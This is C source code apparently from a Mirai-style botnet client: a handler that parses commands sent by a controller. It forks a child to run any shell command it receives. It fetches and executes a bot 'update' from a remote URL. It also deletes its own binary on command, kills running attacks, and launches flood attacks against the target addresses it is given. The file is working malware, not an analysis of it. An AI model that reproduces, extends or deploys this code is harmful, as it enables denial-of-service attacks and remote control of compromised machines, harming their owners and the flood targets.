#define _GNU_SOURCE

#ifdef DEBUG
#endif

#include "../../utils/headers/includes.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/attack.h"

void sys_exit(int status);
void run_speedtest(void);
char *hex_to_text(char *val);
#include "../../utils/headers/attack.h"

/* Missing function declarations */
int sys_unlink(const char *pathname);
#include "../../encryption/chacha20_table.h"

#include "attack.h"
#include "../debug.h"
#ifdef KILLER
#include "../persistence/headers/killer.h"
#endif
#ifdef LOCKER
#include "../persistence/headers/locker.h"
#endif


void bot_update(char *url);
void bot_suicide(void);


void flood_parse(char *buf, int buf_len)
{

    debug("Received %d bytes.\n", buf_len);

    int x = 0;

    uint8_t id, num_of_targets, num_of_options = 0;
    uint16_t time;

    struct flood_target *target = NULL;
    struct flood_flag *opts = NULL;

    // Length prefix already handled in main loop

    if (buf_len < 5)
    {
        debug("Malformed command: too short (%d)\n", buf_len);
        return;
    }

    id = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    time = *(uint16_t *)buf;
    time = ntohs(time);
    buf += sizeof(uint16_t);
    buf_len -= sizeof(uint16_t);

    num_of_targets = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    if (num_of_targets > 0)
    {
        target = (struct flood_target *)calloc(num_of_targets, sizeof(struct flood_target));
        if (!target)
            return;
    }

    for (x = 0; x < num_of_targets; x++)
    {
        if (buf_len < (int)(sizeof(uint32_t) + sizeof(uint8_t)))
        {
            debug("Malformed command: truncated target list\n");
            if (target) free(target);
            return;
        }

        target[x].addr = *((uint32_t *)buf);
        buf += sizeof(uint32_t);
        target[x].netmask = (uint8_t)*buf++;
        buf_len -= (sizeof(uint32_t) + sizeof(uint8_t));

        target[x].sock_addr.sin_family = AF_INET;
        target[x].sock_addr.sin_addr.s_addr = target[x].addr;
        debug(enc[MSG_PARSED_TARGET].string, target[x].addr & 0xff, (target[x].addr >> 8) & 0xff, (target[x].addr >> 16) & 0xff, (target[x].addr >> 24) & 0xff, target[x].netmask);
    }

    if (buf_len < 1)
    {
        debug("Malformed command: missing options count\n");
        if (target) free(target);
        return;
    }

    num_of_options = *(uint8_t *)buf;
    buf += sizeof(uint8_t);
    buf_len -= sizeof(uint8_t);

    if (num_of_options > 0)
    {
        opts = (struct flood_flag *)calloc(num_of_options, sizeof(struct flood_flag));
        if (!opts)
        {
            free(target);
            return;
        }

        for (x = 0; x < num_of_options; x++)
        {
            uint8_t val_len = 0;

            if (buf_len < 2)
            {
                debug("Malformed command: truncated option header\n");
                if (target) free(target);
                if (opts)   free(opts);
                return;
            }

            opts[x].id = *(uint8_t *)buf;
            buf += sizeof(uint8_t);
            buf_len -= sizeof(uint8_t);

            val_len = *(uint8_t *)buf;
            buf += sizeof(uint8_t);
            buf_len -= sizeof(uint8_t);

            if (buf_len < val_len)
            {
                debug("Malformed command: truncated option value\n");
                if (target) free(target);
                if (opts)   free(opts);
                return;
            }

            opts[x].val = calloc(val_len + 1, sizeof (char));
            memcpy(opts[x].val, buf, val_len);

            buf += val_len;
            buf_len -= val_len;
        }
    }

    if (id == 0xFB)
    {
        char *cmd = get_option_string(num_of_options, opts, 133, NULL);
        if (cmd != NULL)
        {
            debug("Executing shell command: %s\n", cmd);
            if (sys_fork() == 0)
            {
                system(cmd);
                sys_exit(0);
            }
        }
        if (target) free(target);
        if (opts)   free(opts);
        return;
    }

    if (id == 0xFC)
    {
        /* Speedtest is a utility, not an attack — run it directly in a child. */
        if (sys_fork() == 0) {
            run_speedtest();
            sys_exit(0);
        }
        if (target) free(target);
        if (opts)   free(opts);
        return;
    }

    if (id == 0xFD)

    {
        char *url = get_option_string(num_of_options, opts, 29, NULL); // OPT_PAYLOAD (29) misused as URL
        if (url != NULL)
            bot_update(url);
        return;
    }

    if (id == 0xFE)
    {
        bot_suicide();
        return;
    }

    if (id == 0xFF)
    {
        killall_attacks();
        return;
    }

    flood_start(id, opts, num_of_options, target, num_of_targets, time);
}

void bot_update(char *url)
{
    debug("Updating bot from %s\n", url);
    if (sys_fork() == 0)
    {
        if (sys_fork() == 0)
        {
            char cmd[2048];
            
            snprintf(cmd, sizeof(cmd), 
                enc[BOT_UPDATE_CMD].string,
                url);
            
#ifdef KILLER
            killer_destroy();
#endif
            sys_sleep(5);
            system(cmd);
        }
        sys_exit(0);
    }
}

void bot_suicide(void)
{
    debug("Bot suicide initiated\n");
#ifdef KILLER
    killer_destroy();
#endif
    char path[1024];
    if (sys_readlink(enc[PROC_SELF_EXE].string, path, sizeof(path) - 1) > 0)
    {
        sys_unlink(path);
    }
    sys_exit(0);
}



char *get_option_string(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].id == opt)
            return opts[i].val;
    }

    return def;
}

char *get_option_hex_string(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].id == opt)
        {
            char *hexxedPayload = hex_to_text(opts[i].val);
            opts[i].val = hexxedPayload;
            return opts[i].val;
        }
    }

    return def;
}

int get_option_number(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, int def)
{
    char *val = get_option_string(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return atoi(val);
}

uint32_t get_option_ip(uint8_t opts_len, struct flood_flag *opts, uint8_t opt, uint32_t def)
{
    char *val = get_option_string(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}
